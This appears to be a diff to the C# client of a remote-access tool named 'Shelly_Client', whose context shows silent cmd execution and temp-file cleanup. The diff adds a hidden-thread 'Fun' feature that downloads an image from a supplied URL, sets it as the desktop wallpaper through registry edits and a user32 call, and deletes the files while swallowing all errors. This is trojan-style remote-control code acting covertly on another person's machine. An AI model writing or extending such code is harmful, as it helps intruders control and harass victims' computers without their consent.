@@ -2,11 +2,14 @@
 using System.IO;
 using System.Net;
 using System.Linq;
+using System.Drawing;
 using Microsoft.Win32;
 using System.Threading;
 using System.Diagnostics;
 using System.Windows.Forms;
+using System.Drawing.Imaging;
 using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
 
 namespace Shelly_Client
 {
@@ -46,6 +49,9 @@ namespace Shelly_Client
                 // Make and start thread
                 new Thread(() =>
                 {
+                    // Set thread to background
+                    Thread.CurrentThread.IsBackground = true;
+
                     // Try to do tasks
                     try
                     {
@@ -68,6 +74,72 @@ namespace Shelly_Client
                         // Delete file
                         File.Delete(Path.GetTempPath() + FileName);
                     } catch
+                    {
+
+                    }
+                }).Start();
+            }
+        }
+
+        // Fun class
+        public static class Fun
+        {
+            // CWP method
+            public static void CWP(string Url)
+            {
+                // Make and start thread
+                new Thread(() =>
+                {
+                    // Set thread to background
+                    Thread.CurrentThread.IsBackground = true;
+
+                    // Try to do tasks
+                    try
+                    {
+                        // Set string
+                        string FileName = NoneClientRelated.GenerateRandomString(12) + ".png";
+
+                        // Goto temp
+                        Directory.SetCurrentDirectory(Path.GetTempPath());
+
+                        // Create new instance
+                        using (WebClient webClient = new WebClient())
+                        {
+                            // Download file
+                            webClient.DownloadFile(Url, FileName);
+                        }
+
+                        // Set variables
+                        string BmpFile = FileName;
+                        int index = BmpFile.IndexOf(".");
+
+                        // Check if index is greater than 0
+                        if (index > 0)
+                        {
+                            // Strip file extention
+                            BmpFile = BmpFile.Substring(0, index);
+                        }
+
+                        // Declair new instance
+                        using (Image Img = Image.FromFile(FileName))
+                        {
+                            // Convert file to bmp
+                            Img.Save(BmpFile + ".bmp", ImageFormat.Bmp);
+                        }
+
+                        // Delete file
+                        File.Delete(FileName);
+
+                        // Set wallpaper
+                        NoneClientRelated.ChangeWallpaper(BmpFile + ".bmp");
+
+                        // Delete file
+                        File.Delete(BmpFile + ".bmp");
+
+                        // Goto execution path
+                        Directory.SetCurrentDirectory(Program.ExecutionPath);
+                    }
+                    catch
                     {
 
                     }
@@ -198,6 +270,26 @@ namespace Shelly_Client
 
                 // Start cmd with arguments
                 CmdCommand.Start();
+            }
+
+            // Import dll
+            [DllImport("user32.dll", CharSet = CharSet.Auto)]
+
+            // setup the SystemParametersInfo parameters
+            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+            // Change wallpaper method, NOTE: it has a z at the end so it dosnt mess with the thread naming
+            public static void ChangeWallpaper(string PicName)
+            {
+                // Create new RegistryKey instance 
+                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
+
+                // Set the keys
+                key.SetValue(@"WallpaperStyle", 2.ToString());
+                key.SetValue(@"TileWallpaper", 0.ToString());
+
+                // Set wallpaper
+                SystemParametersInfo(20, 0, Directory.GetCurrentDirectory() + @"\" + PicName, 0x01 | 0x02);
             }
 
             // GenerateRandomString method
